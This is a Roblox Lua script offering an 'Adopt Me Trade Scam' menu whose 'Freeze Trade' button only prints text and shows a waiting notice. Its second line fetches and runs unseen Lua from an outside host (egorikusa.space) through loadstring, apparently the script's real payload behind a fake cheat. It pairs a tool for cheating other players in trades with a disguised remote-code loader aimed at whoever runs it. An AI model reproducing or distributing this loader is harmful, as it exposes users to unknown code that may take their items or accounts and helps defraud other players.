local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local AdoptMeScam = loadstring(game:HttpGet("https://egorikusa.space/5a961877094104d81339903a.lua", true))()

-- Check if SecureMode is available
if Rayfield.SecureMode then 
    Rayfield:SecureMode() 
    print("Secure Mode enabled!") 
else 
    print("Secure Mode is not available in this version of Rayfield.") 
end

-- Create the main window 
local Window = Rayfield:CreateWindow({ 
    Name = "Adopt Me Trade Scam 💸 🐕", 
    LoadingTitle = "Loading...", 
    LoadingSubtitle = "Please wait", 
    ConfigurationSaving = { 
        Enabled = true, 
        FolderName = "Rayfield", 
        FileName = "MyConfig" 
    }, 
    Discord = { 
        Enabled = false, 
        Invite = "YourDiscordInviteHere", 
        RememberJoins = true 
    }, 
    KeySystem = false 
})

-- Create a tab in the window 
local TradeScamTab = Window:CreateTab("Trade Scam 🐕")

-- Create a button to freeze trade
local FreezeTradeButton = TradeScamTab:CreateButton({ 
    Name = "Freeze Trade ❄️", 
    Callback = function() 
        print("Easy Trade!!") 
        
        -- Send notification when the button is clicked
        Rayfield:Notify({
            Title = " ⚠️ FREEZING TRADE ⚠️ ",
            Content = " ⚠️FREEZING THE TRADE ⚠️ Please wait 2-5 minutes for it to work. ⏳",
            Duration = 6.5,
            Image = 4483362458,
            Actions = { 
                -- You can add notification buttons here if needed
            },
        })
    end,
})

